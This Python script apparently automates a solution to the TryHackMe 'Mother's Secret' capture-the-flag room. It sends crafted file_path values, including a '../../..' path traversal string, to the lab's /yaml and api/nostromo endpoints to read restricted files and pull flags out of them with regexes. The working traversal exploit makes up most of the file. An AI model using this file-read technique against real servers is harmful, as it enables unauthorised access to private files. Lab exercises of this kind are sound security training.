#!/usr/bin/env python3
#
# Script designed to automate a large portion
# of the Mother's Secret room on TryHackMe.
#
# This script will reach out to the various endpoints
# and automatically pick out flags and important files.
#
# To get all the answers to the questions, the user
# can visit the main page and view the Security Officer's
# name and last remaining flag using the arrow buttons on
# their keyboard.

import argparse
import os
import platform
import re
import requests

OVERRIDE_CODE = 100375

class Attacker:
    def __init__(self, baseurl, proxies:bool):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"baseurl must be a string. got {type(baseurl)}")

        baseurl = baseurl.strip("/").strip()
        if len(baseurl) < 1:
            raise ValueError("baseurl cannot be an empty string")

        if not(isinstance(proxies,bool)):
            raise ValueError(f"proxies must be a bool. got {type(proxies)}")

        self.__baseurl = baseurl
        self.__proxies = {"http": "http://localhost:8080", "https": "https://localhost:8080"} if proxies else None
        self.__session = requests.Session()
        self.__timeout = 10
        return

    def __make_request(self, target_route, target_file):
        """
        generic function designed to make a POST request to a
        given route using the provided file in the JSON payload.

        this will return resp.body.text if successful.
        """
        body = str()
        message = str()
        success = bool()
        target_url = f"{self.__baseurl}/{target_route}"

        try:
            payload = {"file_path": target_file}

            resp = self.__session.post(target_url, json=payload, timeout=self.__timeout, proxies=self.__proxies)
            if resp.status_code >= 400:
                raise ValueError(f"({resp.status_code} {resp.reason}) {resp.text}")

            body = resp.text
            message = "request successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (body, success, message)

    def DumpOrderFile(self, order_file:str):
        """
        function designed to read the content of, and
        extract the flag from, the order file leaked by
        the yaml endpoint.
        """
        body = str()
        flag = str()
        flag_pat = r"(Flag{.*})"
        message = str()
        success = bool()
        target_route = "api/nostromo"

        try:
            if not(isinstance(order_file,str)):
                raise TypeError(f"order_file must be a string. got {type(order_file)}")

            body, success, message = self.__make_request(target_route, order_file)
            if not(success):
                raise ValueError(message)
            SucMsg("nostromo route accessed")

            flag, success, message = FindFlag(body, flag_pat)
            if not(success):
                raise ValueError(message)

            message = "order successfully dumped"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (flag, success, message)

    def DumpSecret(self):
        """
        function designed to acquire the location of Mother's Secret,
        then reach out to that location, read and return the secret.
        """
        body = str()
        message = str()
        route = str()
        route_pat = r"(\/[a-zA-Z0-9]+\/[a-zA-Z0-9]+)"
        secret = str()
        secret_pat = r"Flag{.*}"
        secret_path = str()
        success = bool()
        target_file = "secret.txt"
        target_route = "api/nostromo/mother"
        walk = "../../../../../../../../../../.."

        try:
            body, success, message = self.__make_request(target_route, target_file)
            if not(success):
                raise ValueError(message)
            SucMsg("secret route successfully acquired")

            route, success, message = FindFlag(body, route_pat)
            if not(success):
                raise ValueError(message)
            SucMsg(f"secret route: {route}")

            route = route.lstrip("/")
            secret_path = f"{walk}/{route}"

            body, success, message = self.__make_request(target_route, secret_path)
            if not(success):
                raise ValueError(message)
            SucMsg("secret successfully acquired")

            secret, success, message = FindFlag(body, secret_pat)
            if not(success, message):
                raise ValueError(message)

            message = "mother's secret successfully dumped"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (secret, success, message)

    def FindOrderFile(self):
        """
        function designed to hit the "/yaml" endpoint and acquire
        the order file for the Science Officer.
        """
        file_pat = r"\s([a-zA-Z0-9]+\.txt)"
        filename = str()
        message = str()
        success = bool()
        target_file = f"{OVERRIDE_CODE}.yaml"
        target_route = "yaml"

        try:
            body, success, message = self.__make_request(target_route, target_file)
            if not(success):
                raise ValueError(message)
            SucMsg("yaml request successful")

            filename, success, message = FindFlag(body, file_pat)
            if not(success):
                raise ValueError(message)

            message = "secret file discovery successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (filename, success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_GRN}[+]{ANSI_RST} {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_RED}[-]{ANSI_RST} {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_BLU}[i]{ANSI_RST} {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}{ANSI_YLW}[*]{ANSI_RST} {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        ############################################################
        # Normalize data.
        ############################################################
        data = data.lower()

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Normalize flag pattern.
        ############################################################
        flagPattern = flagPattern.lower()

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("--proxy", help="proxy traffic through burp", action="store_true", dest="proxy")
    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure
    proxy = args.proxy

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    InfoMsg(f"Proxy: {proxy}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    try:
        a = Attacker(baseurl, proxies=proxy)

        order_file, success, message = a.FindOrderFile()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        SucMsg(f"Order File: {order_file}")

        flag, success, message = a.DumpOrderFile(order_file)
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        SucMsg(f"Flag 1: {flag}")

        flag, success, message = a.DumpSecret()
        if not(success):
            raise ValueError(message)
        SucMsg(message)

        SucMsg(f"Mother\'s Secret: {flag}")
    except Exception as ex:
        ErrMsg(str(ex))

    return

if __name__ == "__main__":
    main()

